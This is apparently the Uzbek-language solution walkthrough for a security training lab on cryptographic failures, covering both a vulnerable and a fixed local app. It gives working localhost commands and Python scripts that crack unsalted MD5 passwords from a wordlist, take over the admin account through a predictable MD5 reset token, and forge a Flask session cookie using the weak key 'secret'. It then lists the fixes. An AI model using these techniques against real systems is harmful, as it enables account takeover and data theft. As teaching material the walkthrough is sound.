🌐 [English](./SOLUTION.md) · [Русский](./SOLUTION.ru.md) · **Oʻzbekcha**

# A04 — Yechim (spoylerlar!)

Avval [README](./README.uz.md) dagi maslahatlardan foydalanib, laboratoriyani oʻzingiz bajarib koʻring.

## 1. Maʼlumotlar qanday saqlanadi (vulnerable, port 8031)

```bash
curl -s http://127.0.0.1:8031/_lab/dump > dump.json
```

- `password_hash`: 32 ta hex-belgi, yaʼni **tuzsiz MD5**
- `cards.number`: karta raqamlari toʻliq, **ochiq matnda**

## 2. Parollarni lugʻat boʻyicha tanlash

MD5 bir zumda hisoblanadi, tuzsiz esa bir xil parollar bir xil xesh beradi, shuning uchun ularni lugʻat bilan solishtirish mumkin (laboratoriya papkasidan ishga tushiring):

```bash
python3 - <<'EOF'
import hashlib, json
dump = json.load(open("dump.json"))
words = [w.strip() for w in open("wordlist.txt") if w.strip()]
for user in dump["users"]:
    for word in words:
        if hashlib.md5(word.encode()).hexdigest() == user["password_hash"]:
            print(user["username"], "->", word)
EOF
# alice -> sunshine
# bob   -> qwerty
```

`admin` paroli lugʻatda yoʻq, shuning uchun uni bu yoʻl bilan topib boʻlmaydi. Lekin boshqa yoʻllar bor.

## 3. Oldindan aytib boʻladigan tiklash tokeni orqali admin

```bash
# Oʻzimiz uchun tiklashni soʻraymiz va «xat»ni koʻramiz
curl -H 'Content-Type: application/json' -d '{"username":"alice"}' http://127.0.0.1:8031/reset-request
curl http://127.0.0.1:8031/_lab/outbox
# /reset/<32 ta hex-belgi> koʻrinishidagi havola

# Tokenni ismdan olingan MD5 bilan solishtiramiz
echo -n alice | md5sum        # token bilan mos keladi

# Demak, adminning tokeni ham xuddi shunday hisoblanadi
TOKEN=$(echo -n admin | md5sum | cut -d' ' -f1)
curl -H 'Content-Type: application/json' -d '{"new_password":"hacked123"}' http://127.0.0.1:8031/reset/$TOKEN

# Admin sifatida kiramiz va flagni koʻramiz
curl -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"hacked123"}' http://127.0.0.1:8031/login
curl -b jar.txt http://127.0.0.1:8031/me     # FLAG{a04_admin_takeover}
```

## 4. Cookie ni soxtalashtirish orqali admin

Kodda sessiya imzolash kaliti `secret` ga teng, bunday zaif kalitlar lugʻat boʻyicha tanlanadi. Kalitni bilgan holda istalgan sessiyani imzolash mumkin:

```bash
pip install Flask
python3 - <<'EOF'
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
app = Flask("x")
app.secret_key = "secret"
print(SecureCookieSessionInterface().get_signing_serializer(app).dumps({"user": "admin"}))
EOF

curl --cookie "session=<chiqarilgan qiymat>" http://127.0.0.1:8031/me   # FLAG{a04_admin_takeover}
```

## 5. Karta raqamlari

Tizimga kirgan foydalanuvchi uchun `GET /cards` karta raqamini toʻliq qaytaradi, «sizib chiqqan» bazada esa u ochiq matnda yotibdi.

## Tuzatishlar (fixed, port 8032)

| Muammo | Tuzatish |
|--------|----------|
| Tuzsiz MD5 | `generate_password_hash` (unikal tuzli scrypt) |
| Token = MD5(ism) | `secrets.token_urlsafe(32)`, bazada faqat tokenning SHA-256 i, amal qilish muddati 15 daqiqa, bir martalik |
| Sessiya kaliti `secret` | Kalit `SECRET_KEY` dan yoki tasodifiy (`secrets.token_hex(32)`), cookie `HttpOnly` va `SameSite` bilan |
| Kartalar ochiq matnda | Yozishdan oldin Fernet (AES) bilan shifrlash, kalit `DATA_ENCRYPTION_KEY` dan; javobda faqat `**** **** **** 1111` niqobi |
| Roʻyxatdan oʻtishda zaif parollar | Minimal uzunlik 8 belgi |

fixed da tekshirish:

```bash
curl -s http://127.0.0.1:8032/_lab/dump      # scrypt:... xeshlari, kartalar gAAAA... koʻrinishida
# adminning oldindan aytib berilgan tokeni rad etiladi
curl -H 'Content-Type: application/json' -d '{"new_password":"hacked12345"}' \
  http://127.0.0.1:8032/reset/$(echo -n admin | md5sum | cut -d' ' -f1)      # 400
```

`secret` kaliti bilan soxtalashtirilgan cookie qabul qilinmaydi: imzo mos kelmaydi.

## Yana nimani esda tutish kerak
- Kalitni himoyalamasdan shifrlashning maʼnosi yoʻq: kalit maʼlumotlardan alohida saqlanishi kerak (sirlar menejeri, muhit oʻzgaruvchilari).
- Laboratoriyada muhit oʻzgaruvchilari boʻlmasa, kalitlar har bir ishga tushirishda qaytadan yaratiladi. Real tizim uchun bu qabul qilib boʻlmaydi: qayta ishga tushirilgandan keyin eski maʼlumotlarni shifrdan chiqarib boʻlmay qolardi.
- `/_lab/dump` va `/_lab/outbox` himoyalanmagan: bu oʻquv imitatsiyasi. Real ilovalarda bunday endpointlar boʻlmasligi kerak.
